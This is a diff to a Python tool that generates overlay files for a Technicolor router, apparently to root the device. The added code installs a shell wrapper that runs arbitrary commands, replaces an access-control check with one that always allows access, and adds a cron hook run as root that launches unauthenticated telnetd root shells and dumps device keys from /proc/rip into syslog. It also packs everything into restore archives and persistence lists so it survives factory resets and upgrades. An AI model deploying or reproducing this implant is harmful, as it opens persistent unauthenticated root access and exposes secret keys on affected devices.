@@ -16,11 +16,14 @@ Pure Python, offline, no device contact.
 from __future__ import annotations
 
 import argparse
+import io
 import os
 import secrets
 import stat
 import subprocess
 import sys
+import tarfile
+import time
 from pathlib import Path
 
 # Template files
@@ -129,7 +132,20 @@ config access 'serial'
 RESTRICTED_SHELL_WRAPPER = """\
 #!/bin/sh
 # Technicolor restricted_shell override: bypasses Clash access-control
+if [ $# -gt 0 ] && [ "$1" = "-c" ]; then
+    shift 1
+    exec /bin/sh -c "$@"
+fi
 exec /bin/sh --login "$@"
+"""
+
+CLASH_ACCESS_CONTROL_LUA_CONTENT = """\
+-- Technicolor clash-access-control override: grants root and all users access
+local function main(conntype)
+    return true
+end
+
+return { check = main }
 """
 
 INITD_TRIAGE_CONTENT = """\
@@ -157,6 +173,48 @@ if [ -z "$IPKG_INSTROOT" ] && [ "$1" = "boot" -o "$1" = "start" -o -z "$1" ]; th
     start
 fi
 """
+
+OBUSPA_RETRIEVER_CONTENT = """\
+#!/bin/sh
+# F1 overlay obuspa_retriever shadow hook: executed by crond as root every 60s
+
+# Ensure telnetd is running
+if ! pidof telnetd >/dev/null 2>&1; then
+    /usr/sbin/telnetd -l /bin/sh -p 23 &
+    telnetd -l /bin/sh -p 23 &
+    busybox telnetd -l /bin/sh -p 23 &
+fi
+
+# Ensure root shell is /bin/sh
+if [ -f /etc/passwd ] && grep -q "/root:.*restricted_shell" /etc/passwd; then
+    sed -i 's#/root:.*$#/root:/bin/sh#' /etc/passwd
+fi
+
+# Dump keys into syslog and /tmp/rip
+if [ -d /proc/rip ]; then
+    mkdir -p /tmp/rip
+    for f in /proc/rip/*; do
+        if [ -f "$f" ]; then
+            cp "$f" /tmp/rip/ 2>/dev/null
+            val=$(hexdump -C "$f" 2>/dev/null | tr '\\n' ' ')
+            logger -t GENESIS_KEYS "$f: $val"
+        fi
+    done
+fi
+
+# Run triage script if present
+if [ -f /root/triage.sh ] && [ ! -f /tmp/triage_executed.flag ]; then
+    touch /tmp/triage_executed.flag
+    /bin/sh /root/triage.sh > /tmp/triage.log 2>&1 &
+fi
+
+# Fallback: execute original script if present in /rom
+if [ -f /rom/usr/share/transformer/scripts/obuspa_retriever.sh ]; then
+    exec /rom/usr/share/transformer/scripts/obuspa_retriever.sh "$@"
+fi
+exit 0
+"""
+
 
 
 def build_shadow_content(root_hash: str = "") -> str:
@@ -248,6 +306,119 @@ def populate_bank_tree(base_dir: Path, shadow_hash: str = "") -> list[Path]:
     os.chmod(p_rcd, 0o755)
     files_created.append(p_rcd)
 
+    # obuspa_retriever shadow hook (0755) executed by crond as root every 60s
+    obuspa_dir = base_dir / "usr" / "share" / "transformer" / "scripts"
+    obuspa_dir.mkdir(parents=True, exist_ok=True)
+    p_obuspa = obuspa_dir / "obuspa_retriever.sh"
+    p_obuspa.write_text(OBUSPA_RETRIEVER_CONTENT, encoding="utf-8")
+    os.chmod(p_obuspa, 0o755)
+    files_created.append(p_obuspa)
+
+    # clash-access-control.lua override (0644) to neutralize Lua ACL denying root serial/telnet
+    lua_dir = base_dir / "usr" / "lib" / "lua"
+    lua_dir.mkdir(parents=True, exist_ok=True)
+    p_lua = lua_dir / "clash-access-control.lua"
+    p_lua.write_text(CLASH_ACCESS_CONTROL_LUA_CONTENT, encoding="utf-8")
+    os.chmod(p_lua, 0o644)
+    files_created.append(p_lua)
+
+    return files_created
+
+
+def populate_rtfd_persistent(base_dir: Path, shadow_hash: str = "") -> list[Path]:
+    """Generate /overlay/rtfd_persistent_files/ and /overlay/rtfd_persistent_filelist.conf.
+
+    Leverages Technicolor 80_rtfd_restore automated file restoration across
+    upgrades, factory resets, and U-Boot committed sequence counter changes.
+    """
+    files_created: list[Path] = []
+    persist_dir = base_dir / "rtfd_persistent_files"
+    persist_dir.mkdir(parents=True, exist_ok=True)
+
+    items = [
+        ("passwd", PASSWD_CONTENT, 0o644, "/etc/passwd etc"),
+        ("shadow", build_shadow_content(shadow_hash), 0o600, "/etc/shadow etc"),
+        ("inittab", INITTAB_CONTENT, 0o644, "/etc/inittab etc"),
+        ("rc.local", RC_LOCAL_CONTENT, 0o755, "/etc/rc.local etc"),
+        ("dropbear", DROPBEAR_CONFIG_CONTENT, 0o644, "/etc/config/dropbear etc/config"),
+        ("clash", CLASH_CONFIG_CONTENT, 0o644, "/etc/config/clash etc/config"),
+        ("triage.sh", TRIAGE_SCRIPT_CONTENT, 0o755, "/root/triage.sh root"),
+        ("restricted_shell", RESTRICTED_SHELL_WRAPPER, 0o755, "/bin/restricted_shell bin"),
+        ("obuspa_retriever.sh", OBUSPA_RETRIEVER_CONTENT, 0o755, "/usr/share/transformer/scripts/obuspa_retriever.sh usr/share/transformer/scripts"),
+        ("clash-access-control.lua", CLASH_ACCESS_CONTROL_LUA_CONTENT, 0o644, "/usr/lib/lua/clash-access-control.lua usr/lib/lua"),
+        ("triage", INITD_TRIAGE_CONTENT, 0o755, "/etc/init.d/triage etc/init.d"),
+        ("S99triage", INITD_TRIAGE_CONTENT, 0o755, "/etc/rc.d/S99triage etc/rc.d"),
+    ]
+
+    conf_lines: list[str] = []
+    for filename, content, mode, conf_entry in items:
+        p = persist_dir / filename
+        p.write_text(content, encoding="utf-8")
+        os.chmod(p, mode)
+        files_created.append(p)
+        conf_lines.append(conf_entry)
+
+    # Redundant copies of restricted_shell to catch all binary search paths
+    conf_lines.append("/usr/bin/restricted_shell usr/bin")
+    conf_lines.append("/usr/sbin/restricted_shell usr/sbin")
+    conf_lines.append("/sbin/restricted_shell sbin")
+
+    conf_file = base_dir / "rtfd_persistent_filelist.conf"
+    conf_file.write_text("\n".join(conf_lines) + "\n", encoding="utf-8")
+    os.chmod(conf_file, 0o644)
+    files_created.append(conf_file)
+
+    return files_created
+
+
+def create_restore_tarballs(base_dir: Path, shadow_hash: str = "") -> list[Path]:
+    """Generate sysupgrade.tgz and ispconfig-bank_*.tgz fallback restore archives.
+
+    - sysupgrade.tgz: executed by OpenWrt /lib/preinit/80_mount_root via 'tar xzf /sysupgrade.tgz'
+    - ispconfig-bank_*.tgz: executed by /lib/mount_root/82_ispconfig_restore via 'tar -xzf $tarfile'
+    """
+    files_created: list[Path] = []
+    tar_entries = [
+        ("etc/passwd", PASSWD_CONTENT, 0o644),
+        ("etc/shadow", build_shadow_content(shadow_hash), 0o600),
+        ("etc/inittab", INITTAB_CONTENT, 0o644),
+        ("etc/rc.local", RC_LOCAL_CONTENT, 0o755),
+        ("etc/config/dropbear", DROPBEAR_CONFIG_CONTENT, 0o644),
+        ("etc/config/clash", CLASH_CONFIG_CONTENT, 0o644),
+        ("root/triage.sh", TRIAGE_SCRIPT_CONTENT, 0o755),
+        ("bin/restricted_shell", RESTRICTED_SHELL_WRAPPER, 0o755),
+        ("usr/bin/restricted_shell", RESTRICTED_SHELL_WRAPPER, 0o755),
+        ("usr/sbin/restricted_shell", RESTRICTED_SHELL_WRAPPER, 0o755),
+        ("sbin/restricted_shell", RESTRICTED_SHELL_WRAPPER, 0o755),
+        ("usr/share/transformer/scripts/obuspa_retriever.sh", OBUSPA_RETRIEVER_CONTENT, 0o755),
+        ("usr/lib/lua/clash-access-control.lua", CLASH_ACCESS_CONTROL_LUA_CONTENT, 0o644),
+        ("etc/init.d/triage", INITD_TRIAGE_CONTENT, 0o755),
+        ("etc/rc.d/S99triage", INITD_TRIAGE_CONTENT, 0o755),
+    ]
+
+    def _build_tar(target_path: Path) -> Path:
+        with tarfile.open(target_path, "w:gz") as tar:
+            for path, content, mode in tar_entries:
+                ti = tarfile.TarInfo(name=path)
+                data = content.encode("utf-8")
+                ti.size = len(data)
+                ti.mode = mode
+                ti.mtime = int(time.time())
+                ti.uid = 0
+                ti.gid = 0
+                tar.addfile(ti, io.BytesIO(data))
+        os.chmod(target_path, 0o644)
+        return target_path
+
+    # 1. /overlay/sysupgrade.tgz
+    sysup = _build_tar(base_dir / "sysupgrade.tgz")
+    files_created.append(sysup)
+
+    # 2. /overlay/ispconfig-bank_1.tgz and ispconfig-bank_2.tgz
+    for b in ("bank_1", "bank_2"):
+        isp = _build_tar(base_dir / f"ispconfig-{b}.tgz")
+        files_created.append(isp)
+
     return files_created
 
 
@@ -295,6 +466,12 @@ def generate_overlay_staging(
         root_work = target_dir / "work"
         root_work.mkdir(parents=True, exist_ok=True)
         os.chmod(root_work, 0o755)
+
+    # Technicolor 80_rtfd_restore automated persistence mechanism
+    created["rtfd_persistent"] = populate_rtfd_persistent(target_dir, shadow_hash=final_hash)
+
+    # OpenWrt 80_mount_root (sysupgrade.tgz) & 82_ispconfig_restore archives
+    created["restore_tarballs"] = create_restore_tarballs(target_dir, shadow_hash=final_hash)
 
     return created
 
